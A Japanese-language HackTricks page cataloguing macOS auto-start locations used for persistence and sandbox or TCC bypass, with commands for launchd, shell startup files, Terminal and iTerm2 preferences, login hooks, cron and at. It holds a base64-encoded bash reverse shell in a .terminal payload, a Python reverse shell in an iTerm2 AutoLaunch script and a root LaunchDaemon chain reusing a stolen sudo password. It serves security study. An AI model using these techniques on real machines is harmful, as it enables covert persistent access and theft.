# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

このセクションは、[**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)というブログシリーズを大いに参考にしています。目的は、**Autostart Locations**を（可能であれば）さらに追加し、macOSの最新バージョン（13.4）で**現在も動作する technique**を示し、必要な**permissions**を明記することです。

## Sandbox Bypass

> [!TIP]
> ここでは、**sandbox bypass**に役立つ start locationsを紹介します。これは、**root permissions**を必要とせず、**fileに書き込む**だけで何かを実行し、非常に**一般的な** **action**、決められた**時間**、またはsandbox内から通常実行できる**action**を待つことを可能にします。

### Launchd

- Sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> 興味深い事実として、**`launchd`**にはMach-o section `__Text.__config`内にembedded property listがあり、launchdがstartしなければならない、その他のよく知られたservicesが含まれています。さらに、これらのservicesには`RequireSuccess`、`RequireRun`、`RebootOnSuccess`を含めることができ、これはそれらが実行され、正常に完了しなければならないことを意味します。
>
> Ofc、code signingのため変更することはできません。

#### Description & Exploitation

**`launchd`**は、startup時にOX S kernelによって実行される最初の**process**であり、shutdown時に終了する最後のprocessです。常に**PID 1**である必要があります。このprocessは、以下にある**ASEP** **plists**に示されたconfigurationを**read and execute**します。

- `/Library/LaunchAgents`: adminによってinstallされたuserごとのagents
- `/Library/LaunchDaemons`: adminによってinstallされたsystem-wide daemons
- `/System/Library/LaunchAgents`: Appleによって提供されるuserごとのagents。
- `/System/Library/LaunchDaemons`: Appleによって提供されるsystem-wide daemons。

userがログインすると、`/Users/$USER/Library/LaunchAgents`および`/Users/$USER/Library/LaunchDemons`にあるplistsが、**logged users permissions**でstartされます。

**agentsとdaemonsの主な違いは、agentsがuserのログイン時にloadされ、daemonsがsystem startup時にloadされることです**（sshのように、userがsystemへaccessする前に実行する必要があるservicesが存在するためです）。また、agentsはGUIを使用できますが、daemonsはbackgroundで実行する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**userがログインする前にagentを実行する必要がある**ケースがあり、これらは**PreLoginAgents**と呼ばれます。例えば、ログイン時に支援技術を提供する場合に便利です。これらは`/Library/LaunchAgents`にもあります（例は[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)）。

> [!TIP]
> 新しいDaemonまたはAgentの設定ファイルは、**次回の再起動後、または**`launchctl load <target.plist>`**を使用した後にロードされます**。`launchctl -F <file>`を使用すれば、拡張子のない.plistファイルをロードすることも**可能です**（ただし、これらのplistファイルは再起動後に自動的にロードされません）。\
> `launchctl unload <target.plist>`で**アンロード**することも**可能です**（そのファイルが指すプロセスは終了します）。
>
> **Agent**または**Daemon**の**実行を妨げる**もの（overrideなど）が**存在しないことを確認する**には、次を実行します：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

現在のuserによってロードされているすべてのagentとdaemonを一覧表示します：
```bash
launchctl list
```
#### 悪意のある LaunchDaemon chain（password reuse）

最近の macOS infostealer は、**captured sudo password** を再利用して、user agent と root LaunchDaemon を配置しました。

- agent loop を `~/.agent` に書き込み、実行可能にする。
- その agent を指す plist を `/tmp/starter` に生成する。
- 盗んだ password を `sudo -S` で再利用し、`/Library/LaunchDaemons/com.finder.helper.plist` にコピーして `root:wheel` を設定し、`launchctl load` で読み込む。
- `nohup ~/.agent >/dev/null 2>&1 &` で agent をサイレントに起動し、出力を detach する。
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plistがユーザーによって所有されている場合、daemonのシステム全体のフォルダ内にあるとしても、**taskはrootではなくユーザーとして実行されます**。これにより、一部のprivilege escalation攻撃を防ぐことができます。

#### launchdの詳細

**`launchd`**は、**kernel**から起動される最初の**user mode process**です。プロセスの起動は**成功**しなければならず、**終了またはcrashすることはできません**。一部の**killing signal**からも**保護**されています。

`launchd`が最初に行うことの1つは、以下のすべての**daemon**を**起動**することです。

- 実行時刻に基づく**Timer daemon**:
- atd (`com.apple.atrun.plist`): 30分の`StartInterval`を持つ
- crond (`com.apple.systemstats.daily.plist`): 00:15に開始する`StartCalendarInterval`を持つ
- **Network daemon**:
- `org.cups.cups-lpd`: `printer`の`SockServiceName`を使用してTCP（`SockType: stream`）でListenする
- SockServiceNameはポート、または`/etc/services`にあるserviceのいずれかでなければならない
- `com.apple.xscertd.plist`: TCPのポート1640でListenする
- 指定されたpathが変更されたときに実行される**Path daemon**:
- `com.apple.postfix.master`: path `/etc/postfix/aliases`をCheckingする
- **IOKit notifications daemon**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices`エントリに`com.apple.xscertd.helper`という名前を示している
- **UserEventAgent:**
- これは前述のものとは異なります。特定のeventに応答してlaunchdにappをspawnさせます。ただし、この場合に関係するmain binaryは`launchd`ではなく、`/usr/libexec/UserEventAgent`です。これはSIP restricted folderである`/System/Library/UserEventPlugins/`からpluginをloadします。各pluginは`XPCEventModuleInitializer` keyでinitializerを示します。古いpluginの場合は、`Info.plist`の`FB86416D-6164-2070-726F-70735C216EC0` keyにある`CFPluginFactories` dictで示します。

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- ただし、これらのfileをloadするshellを実行するTCC bypassを持つappを見つける必要があります

#### Locations

- **`~/.zshrc`、`~/.zlogin`、`~/.zshenv.zwc`**、**`~/.zshenv`、`~/.zprofile`**
- **Trigger**: zshでterminalを開く
- **`/etc/zshenv`、`/etc/zprofile`、`/etc/zshrc`、`/etc/zlogin`**
- **Trigger**: zshでterminalを開く
- rootが必要
- **`~/.zlogout`**
- **Trigger**: zshでterminalを終了する
- **`/etc/zlogout`**
- **Trigger**: zshでterminalを終了する
- rootが必要
- さらに存在する可能性がある場所: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bashでterminalを開く
- `/etc/profile`（動作しなかった）
- `~/.profile`（動作しなかった）
- `~/.xinitrc`、`~/.xserverrc`、`/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xtermでtriggerされると想定されますが、**インストールされておらず**、インストール後も次のerrorが発生します: xterm: `DISPLAY is not set`

#### Description & Exploitation

`zsh`や`bash`などのshell environmentを開始すると、**特定のstartup fileが実行されます**。現在のmacOSはデフォルトshellとして`/bin/zsh`を使用します。このshellは、Terminal applicationが起動されたとき、またはSSH経由でdeviceにaccessしたときに自動的にaccessされます。macOSには`bash`と`sh`も存在しますが、使用するには明示的にinvokeする必要があります。

`zsh`のman pageは、**`man zsh`**で読むことができ、startup fileについて詳しく説明しています。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 再開される Applications

> [!CAUTION]
> 指定された exploitation の設定を行い、loging-out と loging-in、または reboot を実行しても、私の場合は app を実行できませんでした。（app は実行されていなかったため、これらの操作を行う際に app が実行中である必要があるのかもしれません）

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Restart 時の Applications の再開

#### Description & Exploitation

再開されるすべての Applications は plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 内にあります。

したがって、再開される Applications に自分のものを起動させるには、**自分の app をリストに追加する**だけです。

UUID は、その directory を一覧表示するか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` で確認できます。

再開される Applications を確認するには、次のコマンドを実行します。
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**このリストにアプリケーションを追加する**には、次を使用できます:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal use to have FDA permissions of the user use it

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Terminalを開く

#### Description & Exploitation

**`~/Library/Preferences`** には、Applicationsにおけるユーザーの設定が保存されています。これらの設定の一部には、**他のApplications/scriptsを実行する**ための構成を保持できます。

たとえば、TerminalはStartup時にcommandを実行できます。

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

この設定は、ファイル **`~/Library/Preferences/com.apple.Terminal.plist`** に次のように反映されます。
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
つまり、システム内のターミナルの設定に関する plist を上書きできる場合、**`open`** 機能を使用して**ターミナルを開き、そのコマンドを実行させる**ことができます。

これは CLI から次のように追加できます：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal use to have FDA permissions of the user use it

#### Location

- **Anywhere**
- **Trigger**: Open Terminal

#### Description & Exploitation

[**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) を作成して開くと、**Terminal application** が自動的に起動し、その中に記載されたコマンドを実行します。Terminal app に特別な権限（TCC など）がある場合、そのコマンドはそれらの特別な権限で実行されます。

次の内容で試してください：
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
`**`.command`**`、`**`.tool`**`**` の拡張子を使用し、通常の shell scripts の内容を記述することもできます。これらも Terminal で開かれます。

> [!CAUTION]
> Terminal に **Full Disk Access** がある場合、その action を完了できます（実行された command は terminal window に表示されることに注意してください）。

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加の TCC access を取得できる可能性があります

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- root が必要
- **Trigger**: coreaudiod または computer を restart
- **`/Library/Audio/Plug-ins/Components`**
- root が必要
- **Trigger**: coreaudiod または computer を restart
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod または computer を restart
- **`/System/Library/Components`**
- root が必要
- **Trigger**: coreaudiod または computer を restart

#### Description

前述の writeup によると、**一部の audio plugins を compile** して load させることが可能です。

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加の TCC access を取得できる可能性があります

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins は、**file の preview を trigger**（Finder で file を選択した状態で space bar を押す）し、その file type に対応する **plugin が install** されている場合に execute されます。

独自の QuickLook plugin を compile し、前述のいずれかの location に配置して load させた後、対応する file に移動して space を押し、trigger することが可能です。

### ~~Login/Logout Hooks~~

> [!CAUTION]
> user の LoginHook でも root の LogoutHook でも、私の環境では動作しませんでした。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` のような command を execute できる必要があります
- `~/Library/Preferences/com.apple.loginwindow.plist` にあります

これらは deprecated ですが、user が login したときに commands を execute するために使用できます。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
この設定は`/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`に保存されます。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
削除するには:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root user のものは **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** に保存されます

## Conditional Sandbox Bypass

> [!TIP]
> ここでは、**ファイルに書き込むだけで実行できる**一方、特定の**プログラムがインストールされていること、「一般的ではない」user の操作**や環境など、**あまり一般的でない条件を想定する**ことで **sandbox bypass** に役立つ start locations を紹介します。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、`crontab` binary を実行できる必要があります
- または root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 直接 write access するには root が必要です。`crontab <file>` を実行できる場合は root は不要です
- **Trigger**: cron job に依存します

#### Description & Exploitation

**current user** の cron job を一覧表示するには:
```bash
crontab -l
```
ユーザーのすべての cron jobs は **`/usr/lib/cron/tabs/`** および **`/var/at/tabs/`** でも確認できます（root が必要）。

MacOS では、**一定の頻度**でスクリプトを実行する複数のフォルダーが次の場所にあります：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
そこでは、通常の **cron** **ジョブ**、**at** **ジョブ**（あまり使用されない）、**periodic** **ジョブ**（主に一時ファイルのクリーンアップに使用）を確認できます。daily periodic ジョブは、例えば `periodic daily` で実行できます。

**user cronjob** をプログラムで追加するには、次を使用できます:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 は以前、TCC permissions が granted された状態で使用されていた

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: iTerm を開く
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: iTerm を開く
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: iTerm を開く

#### Description & Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** に保存された Scripts は実行されます。例:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
または:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
スクリプト **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** も実行されます。
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** にある iTerm2 の preferences では、iTerm2 terminal の起動時に**実行する command を指定できます**。

この設定は iTerm2 の settings で構成できます。

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

そして、その command は preferences に反映されます。
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
実行するコマンドは、次のように設定できます：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**を悪用して arbitrary commands を実行する方法は、ほかにも存在する可能性が非常に高いです。

### xbar

解説: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、xbar がインストールされている必要があります
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility permissions を要求します

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: xbar が実行された時点

#### Description

人気のプログラムである [**xbar**](https://github.com/matryer/xbar) がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`** に shell script を作成すると、xbar の起動時に実行されます:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、Hammerspoon がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility permissions を要求する

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: hammerspoon の実行時に一度

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) は、**macOS** 向けの automation platform として機能し、操作に **LUA scripting language** を活用します。特に、完全な AppleScript code の統合や shell scripts の実行をサポートしており、scripting capabilities を大幅に強化しています。

この app は単一のファイル `~/.hammerspoon/init.lua` を探し、起動時にその script が実行されます。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、BetterTouchTool がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts および Accessibility permissions を要求する

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

この tool を使用すると、特定の shortcut が押されたときに実行する applications または scripts を指定できます。攻撃者は、任意の code を実行させるために、**shortcut と database 内で実行する action** を設定できる可能性があります（shortcut は単にキーを押すだけのものでもかまいません）。

### Alfred

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、Alfred がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation、Accessibility、さらに Full-Disk access permissions まで要求する

#### Location

- `???`

特定の条件が満たされたときに code を実行できる workflows を作成できます。攻撃者が workflow file を作成し、Alfred にロードさせることができる可能性があります（workflows を使用するには premium version の購入が必要です）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、ssh が有効化され、使用されている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH は FDA access を使用する

#### Location

- **`~/.ssh/rc`**
- **Trigger**: ssh 経由での Login
- **`/etc/ssh/sshrc`**
- root が必要
- **Trigger**: ssh 経由での Login

> [!CAUTION]
> ssh を有効にするには Full Disk Access が必要です:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

デフォルトでは、`/etc/ssh/sshd_config` に `PermitUserRC no` が設定されていない限り、user が **SSH 経由で login** すると、scripts **`/etc/ssh/sshrc`** および **`~/.ssh/rc`** が実行されます。

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、args 付きで `osascript` を実行する必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- `osascript` を呼び出す exploit payload が保存される
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- root が必要

#### Description

System Preferences -> Users & Groups -> **Login Items** では、**user が login したときに実行される items** を確認できます。\
command line から、それらの list、add、remove を行うことが可能です:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
これらの項目はファイル **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** に保存されます。

**Login items** は、API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使用して指定することもでき、その設定は **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** に保存されます。

### ZIP as Login Item

（Login Items に関する前のセクションを確認してください。これはその拡張です）

**ZIP** ファイルを **Login Item** として保存すると、**`Archive Utility`** がそれを開きます。たとえば、その zip が **`~/Library`** に保存され、バックドアを含む **`LaunchAgents/file.plist`** フォルダーが含まれていた場合、そのフォルダーが作成され（デフォルトでは存在しません）、plist が追加されます。そのため、次回ユーザーが再度ログインしたときに、plist に指定された **バックドアが実行されます**。

別の方法として、ユーザーの HOME 内に **`.bash_profile`** と **`.zshenv`** ファイルを作成することもできます。これにより、LaunchAgents フォルダーがすでに存在する場合でも、この technique は機能します。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし **`at`** を **実行**する必要があり、**有効化**されていなければなりません
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** を **実行**する必要があり、**有効化**されていなければなりません

#### **Description**

`at` tasks は、特定の時刻に実行する **one-time tasks のスケジューリング**用に設計されています。cron jobs とは異なり、`at` tasks は実行後に自動的に削除されます。これらの tasks はシステムの再起動後も保持されるため、特定の状況ではセキュリティ上の懸念となる可能性がある点に注意が必要です。

**デフォルト**では**無効**ですが、**root** user は以下を使用して**有効化**できます:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
これにより、1時間後にファイルが作成されます：
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq:`を使用してジョブキューを確認します。
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上では、スケジュールされた2つのジョブを確認できます。`at -c JOBNUMBER`を使用して、ジョブの詳細を表示できます。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks が有効になっていない場合、作成された tasks は実行されません。

**job files** は `/private/var/at/jobs/` にあります。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
ファイル名には queue、job number、実行予定時刻が含まれています。例として `a0001a019bdcd2` を見てみましょう。

- `a` - queue
- `0001a` - 16進数の job number、`0x1a = 26`
- `019bdcd2` - 16進数の時刻。epoch から経過した分数を表します。`0x019bdcd2` は10進数で `26991826` です。これに60を掛けると `1619509560` となり、`GMT: 2021. April 27., Tuesday 7:46:00` です。

job file を表示すると、`at -c` を使って取得したものと同じ情報が含まれていることがわかります。

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- sandbox の bypass に便利: [✅](https://emojipedia.org/check-mark-button)
